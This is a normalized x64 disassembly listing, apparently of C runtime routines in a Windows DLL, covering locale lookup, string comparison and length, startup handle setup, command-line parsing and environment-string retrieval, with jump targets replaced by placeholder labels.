bts eax 0x8
mov [ rdi + 0x150 ] eax
jmp r-xdata
mov eax [ rdi + 0x150 ]
test al 0x1
jne r-xdata
movsxd r8 [ rdi + 0x154 ]
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x20 ]
call sub_18001b8a8
cmp eax ebp
jne r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x20 ]
call sub_18001b6ec
cmp eax ebp
jne r-xdata
bts [ rdi + 0x150 ] 0x8
mov rcx [ rdi + 0x140 ]
call sub_1800174b0
cmp eax [ rdi + 0x154 ]
jne r-xdata
cmp [ rdi + 0x160 ] ebp
jne r-xdata
mov edx ebp
lea rcx [ r--data ]
mov rcx [ rdi + 0x140 ]
or [ rdi + 0x150 ] 0x2
mov [ rdi + 0x164 ] ebx
call sub_1800174b0
cmp eax [ rdi + 0x154 ]
jne r-xdata
xor edx edx
mov [ rdi + 0x160 ] ebx
mov edx 0x1
jmp r-xdata
inc edx
add rcx 0x2
cmp edx 0xa
jb r-xdata
mov [ rdi + 0x160 ] ebx
jmp r-xdata
lea r8 [ rdi + 0x140 ]
mov ecx ebx
call sub_180016cd8
cmp eax ebp
je r-xdata
cmp bx [ rcx ]
je r-xdata
or eax 0x1
mov [ rdi + 0x150 ] eax
sub_180017020
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
mov rbx rcx
call sub_180010a54
mov rcx rbx
mov rdi rax
call sub_180016bb4
mov ecx [ rdi + 0x158 ]
neg ecx
lea r8 [ rsp + 0x20 ]
mov r9d 0x78
sbb edx edx
mov ecx eax
mov ebx eax
and edx 0xfffff002
add edx 0x1001
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x20 ]
call sub_18001b6ec
test eax eax
jne r-xdata
and [ rdi + 0x150 ] eax
mov eax 0x1
jmp r-xdata
cmp [ rdi + 0x158 ] 0x0
jne r-xdata
cmp [ rdi + 0x158 ] eax
jne r-xdata
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_180017570
mov rbx [ rsp + 0xc8 ]
add rsp 0xb0
pop rdi
retn
mov eax [ rdi + 0x150 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ rdi + 0x154 ] 0x0
je r-xdata
or [ rdi + 0x150 ] 0x4
mov [ rdi + 0x160 ] ebx
mov [ rdi + 0x164 ] ebx
lea edx [ rax + 0x1 ]
jmp r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x20 ]
call sub_18001b6ec
test eax eax
jne r-xdata
lea r8 [ rdi + 0x140 ]
mov ecx ebx
call sub_180016cd8
test eax eax
je r-xdata
xor edx edx
sub_180017130
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
call sub_1800174b0
mov rcx [ rbx + 0x8 ]
xor edx edx
cmp rax 0x3
sete dl
mov [ rbx + 0x18 ] edx
call sub_1800174b0
xor ecx ecx
cmp rax 0x3
sete cl
and [ rbx + 0x20 ] 0x0
cmp [ rbx + 0x18 ] 0x0
mov [ rbx + 0x1c ] ecx
je r-xdata
mov rax [ rbx ]
xor edx edx
mov edx 0x2
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
and [ rbx + 0x10 ] 0x0
bt [ rbx + 0x10 ] 0x9
jae r-xdata
mov [ rbx + 0x14 ] edx
lea rcx [ sub_180016d8c ]
mov edx 0x1
call [ EnumSystemLocalesA@IAT ]
bt [ rbx + 0x10 ] 0x8
jae r-xdata
inc edx
jmp r-xdata
test [ rbx + 0x10 ] 0x7
jne r-xdata
mov cl [ rax ]
inc rax
cmp cl 0x41
jl r-xdata
add rsp 0x20
pop rbx
retn
sub_1800171c4
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
call sub_1800174b0
xor edx edx
cmp rax 0x3
sete dl
mov [ rbx + 0x18 ] edx
test edx edx
je r-xdata
mov rax [ rbx ]
xor edx edx
mov edx 0x2
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
add rsp 0x20
pop rbx
retn
and [ rbx + 0x10 ] 0x0
mov [ rbx + 0x14 ] edx
lea rcx [ sub_180017020 ]
mov edx 0x1
call [ EnumSystemLocalesA@IAT ]
test [ rbx + 0x10 ] 0x4
jne r-xdata
inc edx
jmp r-xdata
mov cl [ rax ]
inc rax
cmp cl 0x41
jl r-xdata
sub_180017230
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x30
mov r12 r8
mov rbp rdx
mov rsi rcx
call sub_180010a54
lea rbx [ rax + 0x140 ]
test rsi rsi
jne r-xdata
lea rax [ rsi + 0x40 ]
mov [ rbx ] rsi
mov [ rbx + 0x8 ] rax
test rax rax
je r-xdata
or [ rbx + 0x10 ] 0x104
jmp r-xdata
mov rax [ rbx ]
and [ rbx + 0x10 ] 0x0
test rax rax
je r-xdata
cmp [ rax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ rbx + 0x20 ] eax
mov [ rbx + 0x24 ] eax
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
cmp [ rax ] 0x0
je r-xdata
lea r8 [ rbx + 0x8 ]
lea rcx [ r--data ]
mov edx 0x16
call sub_180016a54
xor eax eax
lea rax [ rsi + 0x80 ]
neg rsi
mov rdx rbx
sbb rcx rcx
and rcx rax
call sub_180016aec
mov edi eax
test eax eax
je r-xdata
mov [ rbx + 0x10 ] 0x104
cmp [ rcx ] 0x0
je r-xdata
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
cmp eax 0xfde8
je r-xdata
call sub_1800174b0
xor ecx ecx
mov edx 0x1
cmp rax 0x3
sete cl
mov [ rbx + 0x1c ] ecx
lea rcx [ sub_180016bf0 ]
call [ EnumSystemLocalesA@IAT ]
test [ rbx + 0x10 ] 0x4
jne r-xdata
mov rcx rbx
call sub_1800171c4
cmp [ rax ] 0x0
je r-xdata
cmp eax 0xfde9
je r-xdata
cmp [ rbx + 0x10 ] 0x0
je r-xdata
and [ rbx + 0x10 ] 0x0
jmp r-xdata
lea rcx [ r--data ]
mov r8 rbx
mov edx 0x40
call sub_180016a54
test eax eax
je r-xdata
mov rcx rbx
call sub_180017130
jmp r-xdata
movzx ecx ax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
cmp [ rbx + 0x10 ] 0x0
jne r-xdata
mov ecx [ rbx + 0x20 ]
mov edx 0x1
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
mov rcx rbx
call sub_1800171c4
jmp r-xdata
cmp [ rax ] 0x0
je r-xdata
test rbp rbp
je r-xdata
mov rcx rbx
call sub_180017130
jmp r-xdata
test r12 r12
je r-xdata
movzx eax [ rbx + 0x20 ]
mov [ rbp ] ax
movzx eax [ rbx + 0x24 ]
mov [ rbp + 0x4 ] di
mov [ rbp + 0x2 ] ax
mov eax 0x1
jmp r-xdata
mov eax 0x814
cmp [ rbp ] ax
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
mov ecx [ rbx + 0x20 ]
mov r9d 0x40
mov r8 r12
mov edx 0x1001
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
lea r8 [ r--data ]
mov edx 0x40
mov rcx r12
call sub_18001695c
test eax eax
je r-xdata
mov ecx [ rbx + 0x24 ]
lea r8 [ r12 + 0x40 ]
mov edx 0x1002
mov r9d 0x40
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001063c
jmp r-xdata
mov r9d 0xa
lea rdx [ r12 + 0x80 ]
mov ecx edi
lea r8d [ r9 + 0x6 ]
call sub_18001ba08
sub_1800174b0
mov rax rcx
neg rcx
test rax 0x7
je r-xdata
mov r8 0x7efefefefefefeff
mov r11 0x8101010101010100
nop
mov rdx [ rax ]
mov r9 r8
add rax 0x8
add r9 rdx
not rdx
xor rdx r9
and rdx r11
je r-xdata
mov rdx [ rax - 0x8 ]
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x1 ]
retn
test al 0x7
jne r-xdata
lea rax [ rcx + rax - 0x8 ]
retn
test dh dh
je r-xdata
mov dl [ rax ]
inc rax
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x7 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x6 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x5 ]
retn
shr rdx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x4 ]
retn
test dh dh
je r-xdata
lea rax [ rcx + rax - 0x3 ]
retn
shr edx 0x10
test dl dl
je r-xdata
lea rax [ rcx + rax - 0x2 ]
retn
test dh dh
jne r-xdata
sub_1800175a0
sub rdx rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
test cl 0x7
je r-xdata
xor rax rax
retn
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov r9 r8
shr r9 0x3
jne r-xdata
nop
sbb eax eax
sbb eax 0xffffffff
retn
inc rcx
dec r8
jne r-xdata
shr r9 0x2
je r-xdata
inc rcx
dec r8
test cl 0x7
jne r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov al [ rcx ]
cmp al [ rdx + rcx ]
jne r-xdata
mov rax [ rcx ]
cmp rax [ rdx + rcx ]
jne r-xdata
mov rcx [ rcx + rdx ]
bswap rax
bswap rcx
cmp rax rcx
sbb eax eax
sbb eax 0xffffffff
retn
mov rax [ rcx + 0x8 ]
cmp rax [ rdx + rcx + 0x8 ]
jne r-xdata
add rcx 0x8
dec r9
jne r-xdata
add rcx 0x8
mov rax [ rcx + 0x10 ]
cmp rax [ rdx + rcx + 0x10 ]
jne r-xdata
and r8 0x7
jmp r-xdata
add rcx 0x8
mov rax [ rcx + 0x18 ]
cmp rax [ rdx + rcx + 0x18 ]
jne r-xdata
add rcx 0x8
add rcx 0x20
dec r9
jne r-xdata
and r8 0x1f
sub_180017668
mov [ rsp + 0x20 ] r9d
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x40
lea rbp [ rsp + 0x30 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x8 ] rax
mov r9d [ rw-data ]
mov edi 0x1
xor ebx ebx
mov r14 r8
mov r15d edx
mov r13 rcx
lea esi [ rdi + 0x1 ]
cmp r9d ebx
jne r-xdata
cmp r9d esi
je r-xdata
lea r9 [ rbp ]
lea rdx [ r--data ]
mov r8d edi
mov ecx edi
call [ GetStringTypeW@IAT ]
cmp eax ebx
je r-xdata
mov r12d [ rbp + 0x70 ]
mov rdi rbx
cmp r12d ebx
jne r-xdata
cmp r9d ebx
je r-xdata
call [ GetLastError@IAT ]
mov r9d [ rw-data ]
cmp eax 0x78
cmove r9d esi
mov [ rw-data ] r9d
mov [ rw-data ] edi
jmp r-xdata
mov esi [ rbp + 0x68 ]
cmp esi ebx
jne r-xdata
mov rax [ r13 ]
mov r12d [ rax + 0x14 ]
cmp r9d edi
jne r-xdata
mov esi [ rbp + 0x68 ]
cmp esi ebx
jne r-xdata
mov ecx r12d
call sub_18001bb7c
cmp eax 0xffffffff
jne r-xdata
mov rax [ r13 ]
mov esi [ rax + 0x4 ]
xor eax eax
jmp r-xdata
neg [ rbp + 0x78 ]
mov r9d [ rbp + 0x58 ]
mov r8 r14
sbb edx edx
mov ecx esi
mov [ rsp + 0x28 ] ebx
and edx 0x8
mov [ rsp + 0x20 ] rbx
add edx edi
call [ MultiByteToWideChar@IAT ]
movsxd r12 eax
cmp r12d ebx
je r-xdata
mov rax [ r13 ]
mov esi [ rax + 0x4 ]
cmp eax esi
je r-xdata
mov rcx [ rbp + 0x8 ]
xor rcx rbp
call sub_180017570
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r13d 0xdddd
jle r-xdata
mov rax [ rbp + 0x60 ]
mov r9d [ rbp + 0x58 ]
mov r8 r14
mov edx r15d
mov ecx r12d
mov [ rsp + 0x20 ] rax
call [ GetStringTypeA@IAT ]
mov esi eax
cmp rdi rbx
je r-xdata
lea r9 [ rbp + 0x58 ]
mov r8 r14
mov edx eax
mov ecx esi
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call sub_18001bbd0
mov rdi rax
cmp rax rbx
je r-xdata
mov rdi rbx
mov rax 0x7ffffffffffffff0
cmp r12 rax
ja r-xdata
mov eax esi
mov rcx rdi
call sub_18000e06c
mov r14 rax
mov r8 r12
xor edx edx
mov rcx rdi
add r8 r8
call sub_180016870
mov r9d [ rbp + 0x58 ]
mov r8 r14
mov edx 0x1
mov ecx esi
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
lea rcx [ r12 + r12 + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rdi - 0x10 ]
cmp [ rcx ] r13d
jne r-xdata
mov r9 [ rbp + 0x60 ]
mov r8d eax
mov rdx rdi
mov ecx r15d
call [ GetStringTypeW@IAT ]
mov ebx eax
call sub_18000e0ac
mov rdi rax
cmp rax rbx
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax ebx
jmp r-xdata
call sub_18000e06c
cmp rdi rbx
je r-xdata
mov [ rax ] r13d
and rax 0xfffffffffffffff0
call sub_1800232c0
sub rsp rax
lea rdi [ rsp + 0x30 ]
cmp rdi rbx
je r-xdata
mov rax 0xffffffffffffff0
mov [ rdi ] 0xcccc
jmp r-xdata
add rdi 0x10
jmp r-xdata
sub_1800178d4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x60
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x40 ]
mov ebx r9d
mov rdi r8
call sub_18000d428
mov eax [ rsp + 0xa0 ]
mov r11d [ rsp + 0xa8 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x38 ] r11d
mov [ rsp + 0x30 ] eax
mov eax [ rsp + 0x98 ]
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x90 ]
mov r9d ebx
mov r8 rdi
mov edx esi
mov [ rsp + 0x20 ] rax
call sub_180017668
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x60
pop rdi
retn
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180017970
test r8 r8
je r-xdata
xor rax rax
retn
sub rdx rcx
mov r9 rdx
mov r11 0x8101010101010100
test cl 0x7
je r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
mov al [ rcx ]
mov dl [ rcx + r9 ]
inc rcx
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
dec r8
je r-xdata
add rcx 0x8
sub r8 0x8
mov r10 0x7efefefefefefeff
jbe r-xdata
test al al
je r-xdata
xor rax 0xffffffffffffffff
add r10 rdx
xor rax r10
test r11 rax
je r-xdata
test rcx 0x7
jne r-xdata
jmp r-xdata
test dl dl
je r-xdata
xor rax rax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_180017a28
sub rsp 0x38
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x20 ] rax
mov al [ rdx ]
xor r11d r11d
mov r10 rdx
mov [ rsp ] r11
mov [ rsp + 0x8 ] r11
mov [ rsp + 0x10 ] r11
mov [ rsp + 0x18 ] r11
mov r9 rcx
jmp r-xdata
cmp al r11b
jne r-xdata
movzx r8d al
movzx eax al
mov edx 0x1
and eax 0x7
shr r8 0x3
mov cl al
shl dl cl
or [ rsp + r8 ] dl
inc r10
mov al [ r10 ]
jmp r-xdata
mov r8b [ r9 ]
cmp r8b r11b
jne r-xdata
movzx ecx r8b
movzx eax r8b
mov edx 0x1
and ecx 0x7
shr rax 0x3
shl edx cl
test [ rsp + rax ] dl
jne r-xdata
xor eax eax
mov rax r9
jmp r-xdata
inc r9
mov rcx [ rsp + 0x20 ]
xor rcx rsp
call sub_180017570
add rsp 0x38
retn
sub_180017ac4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
push r14
push r15
sub rsp 0x90
lea rcx [ rsp + 0x20 ]
call [ GetStartupInfoA@IAT ]
nop
mov edx 0x58
lea r12d [ rdx - 0x38 ]
mov rcx r12
call sub_180011510
mov r11 rax
xor r15d r15d
cmp rax r15
jne r-xdata
mov [ rw-data ] rax
mov ecx r12d
mov [ rw-data ] ecx
add rax 0xb00
cmp r11 rax
jae r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ rsp + 0x62 ] r15w
je r-xdata
mov [ r11 + 0x8 ] r15b
or [ r11 ] 0xffffffffffffffff
mov [ r11 + 0x9 ] 0xa
mov [ r11 + 0xc ] r15d
mov [ r11 + 0x38 ] r15b
mov [ r11 + 0x39 ] 0xa
mov [ r11 + 0x3a ] 0xa
mov [ r11 + 0x50 ] r15d
mov [ r11 + 0x4c ] r15b
add r11 0x58
mov rax [ rw-data ]
add rax 0xb00
cmp r11 rax
jb r-xdata
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov r12 [ r11 + 0x38 ]
mov rsp r11
pop r15
pop r14
pop r13
retn
mov r12d r15d
mov rdi r15
mov rax [ rsp + 0x68 ]
cmp rax r15
je r-xdata
mov ecx [ rw-data ]
mov [ rbx + 0x8 ] 0x81
lea eax [ r12 - 0x1 ]
neg eax
sbb ecx ecx
add ecx 0xfffffff5
mov eax 0xfffffff6
cmp r12d r15d
cmove ecx eax
call [ GetStdHandle@IAT ]
mov rsi rax
cmp rax 0xffffffffffffffff
je r-xdata
cmp [ rbx ] 0xfffffffffffffffe
je r-xdata
lea r13 [ rax + 0x4 ]
movsxd rsi [ rax ]
add rsi r13
mov ebx 0x800
cmp [ rax ] ebx
cmovl ebx [ rax ]
mov edi 0x1
cmp ecx ebx
jge r-xdata
or [ rbx + 0x8 ] 0x40
mov [ rbx ] 0xfffffffffffffffe
cmp rax r15
je r-xdata
or [ rbx + 0x8 ] 0x80
jmp r-xdata
lea r14 [ rw-data ]
lea r14 [ rw-data ]
mov rbx rdi
imul rbx rbx 0x58
add rbx [ rw-data ]
cmp [ rbx ] 0xffffffffffffffff
je r-xdata
mov ecx [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
mov rcx rax
call [ GetFileType@IAT ]
cmp eax r15d
je r-xdata
inc r12d
inc rdi
cmp rdi 0x3
jl r-xdata
cmp [ rsi ] 0xffffffffffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov [ r14 + rdi * 8 ] rax
mov eax [ rw-data ]
add eax r12d
mov [ rw-data ] eax
lea rcx [ r11 + 0xb00 ]
cmp r11 rcx
jae r-xdata
mov [ rbx ] rsi
movzx eax al
cmp eax 0x2
jne r-xdata
inc edi
inc r13
add rsi 0x8
cmp edi ebx
jl r-xdata
cmp [ rsi ] 0xfffffffffffffffe
je r-xdata
mov edi r15d
cmp ebx r15d
jle r-xdata
inc rdi
cmp eax ebx
jl r-xdata
mov [ r11 + 0x8 ] r15b
or [ r11 ] 0xffffffffffffffff
mov [ r11 + 0x9 ] 0xa
mov [ r11 + 0xc ] r15d
and [ r11 + 0x38 ] 0x80
mov [ r11 + 0x39 ] 0xa
mov [ r11 + 0x3a ] 0xa
mov [ r11 + 0x50 ] r15d
mov [ r11 + 0x4c ] r15b
add r11 0x58
mov rax [ r14 + rdi * 8 ]
add rax 0xb00
cmp r11 rax
jb r-xdata
cmp eax 0x3
jne r-xdata
or [ rbx + 0x8 ] 0x40
jmp r-xdata
test [ r13 ] 0x1
je r-xdata
mov edx 0x58
mov rcx r12
call sub_180011510
mov r11 rax
cmp rax r15
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
lea rcx [ rbx + 0x10 ]
mov edx 0xfa0
call sub_180019c14
cmp eax r15d
je r-xdata
or [ rbx + 0x8 ] 0x8
test [ r13 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ rbx + 0xc ]
jmp r-xdata
movsxd r12 edi
mov rax r12
sar rax 0x5
and r12d 0x1f
imul r12 r12 0x58
add r12 [ r14 + rax * 8 ]
mov rax [ rsi ]
mov [ r12 ] rax
mov al [ r13 ]
mov [ r12 + 0x8 ] al
lea rcx [ r12 + 0x10 ]
mov edx 0xfa0
call sub_180019c14
cmp eax r15d
je r-xdata
mov rcx [ rsi ]
call [ GetFileType@IAT ]
cmp eax r15d
je r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ r12 + 0xc ]
jmp r-xdata
sub_180017db4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
lea rax [ rw-data ]
add rbx 0x8
cmp rbx rax
jl r-xdata
lea rax [ rdi + 0xb00 ]
jmp r-xdata
mov rdi [ rbx ]
test rdi rdi
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
cmp rdi rax
jb r-xdata
cmp [ rdi + 0xc ] 0x0
je r-xdata
mov rcx [ rbx ]
call sub_18000e06c
and [ rbx ] 0x0
mov rax [ rbx ]
add rdi 0x58
add rax 0xb00
lea rcx [ rdi + 0x10 ]
call [ DeleteCriticalSection@IAT ]
sub_180017e20
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
cmp [ rw-data ] 0x0
jne r-xdata
mov rbx [ rw-data ]
xor edi edi
test rbx rbx
jne r-xdata
call sub_180012418
mov al [ rbx ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
lea eax [ rdi + 0x1 ]
mov edx 0x8
movsxd rcx eax
call sub_180011510
mov rdi rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rcx rbx
call sub_1800174b0
lea rbx [ rbx + rax + 0x1 ]
inc edi
mov rbx [ rw-data ]
cmp [ rbx ] 0x0
je r-xdata
mov rcx rbx
call sub_18000e06c
and [ rw-data ] 0x0
and [ rdi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
mov rcx rbx
call sub_1800174b0
cmp [ rbx ] 0x3d
lea esi [ rax + 0x1 ]
je r-xdata
movsxd rax esi
add rbx rax
cmp [ rbx ] 0x0
jne r-xdata
movsxd rbp esi
mov edx 0x1
mov rcx rbp
call sub_180011510
mov [ rdi ] rax
test rax rax
je r-xdata
mov rbx [ rw-data ]
mov rcx [ rw-data ]
call sub_18000e06c
and [ rw-data ] 0x0
jmp r-xdata
mov r8 rbx
mov rdx rbp
mov rcx rax
call sub_18001695c
test eax eax
je r-xdata
add rdi 0x8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18001063c
sub_180017f50
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r13 [ rsp + 0x60 ]
mov r14 r9
mov rdi r8
and [ r13 ] 0x0
mov r12 rdx
mov rbx rcx
mov [ r9 ] 0x1
test rdx rdx
je r-xdata
xor ebp ebp
mov [ rdx ] r8
add r12 0x8
inc [ r13 ]
test rdi rdi
je r-xdata
xor eax eax
test ebp ebp
mov sil 0x22
sete al
inc rbx
mov ebp eax
jmp r-xdata
movzx esi [ rbx ]
inc rbx
mov ecx esi
call sub_18001bed4
test eax eax
je r-xdata
mov al [ rbx ]
mov [ rdi ] al
inc rdi
test ebp ebp
jne r-xdata
test sil sil
je r-xdata
inc [ r13 ]
test rdi rdi
je r-xdata
cmp [ rbx ] 0x22
jne r-xdata
cmp sil 0x20
je r-xdata
dec rbx
inc rbx
mov al [ rbx ]
mov [ rdi ] al
inc rdi
test rdi rdi
je r-xdata
cmp sil 0x9
jne r-xdata
test r12 r12
je r-xdata
cmp [ rbx ] 0x20
je r-xdata
xor esi esi
mov [ rdi - 0x1 ] 0x0
jmp r-xdata
inc [ r14 ]
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
and [ r12 ] 0x0
inc rbx
jmp r-xdata
cmp [ rbx ] 0x9
jne r-xdata
cmp [ rbx ] 0x0
je r-xdata
test r12 r12
je r-xdata
inc [ r14 ]
mov [ r12 ] rdi
add r12 0x8
cmp [ rbx ] 0x5c
je r-xdata
inc rbx
inc ecx
cmp [ rbx ] 0x22
jne r-xdata
test ecx ecx
jne r-xdata
test dl cl
jne r-xdata
dec ecx
test rdi rdi
je r-xdata
mov al [ rbx ]
test al al
je r-xdata
shr ecx 0x1
jmp r-xdata
test esi esi
je r-xdata
inc [ r13 ]
mov [ rdi ] 0x5c
inc rdi
test rdi rdi
je r-xdata
test esi esi
jne r-xdata
xor eax eax
xor edx edx
test esi esi
sete al
mov esi eax
lea rax [ rbx + 0x1 ]
cmp [ rax ] 0x22
jne r-xdata
inc [ r13 ]
jmp r-xdata
mov [ rdi ] 0x0
inc rdi
test edx edx
je r-xdata
cmp al 0x20
je r-xdata
mov rbx rax
jmp r-xdata
cmp [ rbx ] 0x0
je r-xdata
inc rbx
jmp r-xdata
movsx ecx al
call sub_18001bed4
test rdi rdi
je r-xdata
cmp al 0x9
je r-xdata
mov edx 0x1
xor ecx ecx
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
inc [ r13 ]
inc rbx
inc [ r13 ]
mov al [ rbx ]
mov [ rdi ] al
inc rdi
jmp r-xdata
mov al [ rbx ]
inc rbx
mov [ rdi ] al
inc rdi
inc [ r13 ]
sub_180018120
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x30
cmp [ rw-data ] 0x0
jne r-xdata
lea rdi [ rw-data ]
mov r8d 0x104
xor ecx ecx
mov rdx rdi
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
mov rbx [ rw-data ]
mov [ rw-data ] rdi
test rbx rbx
je r-xdata
call sub_180012418
mov rbx rdi
cmp [ rbx ] 0x0
jne r-xdata
or eax 0xffffffff
movsxd rcx [ rsp + 0x48 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
xor r8d r8d
xor edx edx
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_180017f50
movsxd rsi [ rsp + 0x40 ]
mov rcx 0x1fffffffffffffff
cmp rsi rcx
jae r-xdata
lea rdx [ rcx + rsi * 8 ]
cmp rdx rcx
jb r-xdata
mov rcx rdx
call sub_1800114a4
mov rdi rax
test rax rax
je r-xdata
lea r8 [ rax + rsi * 8 ]
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
mov rdx rdi
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_180017f50
mov r11d [ rsp + 0x40 ]
mov [ rw-data ] rdi
dec r11d
xor eax eax
mov [ rw-data ] r11d
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
sub_180018218
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x40
mov ecx [ rw-data ]
xor r12d r12d
mov rbx r12
lea esi [ r12 + 0x2 ]
cmp ecx r12d
jne r-xdata
cmp ecx 0x1
jne r-xdata
call [ GetEnvironmentStringsW@IAT ]
mov rbx rax
cmp rax r12
je r-xdata
cmp ecx esi
je r-xdata
cmp rbx r12
jne r-xdata
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
cmp eax 0x78
cmove ecx esi
mov [ rw-data ] ecx
mov [ rw-data ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov rbx rax
cmp rax r12
je r-xdata
cmp ecx r12d
jne r-xdata
mov rdi rbx
cmp [ rbx ] r12w
je r-xdata
call [ GetEnvironmentStringsW@IAT ]
mov rbx rax
cmp rax r12
jne r-xdata
xor eax eax
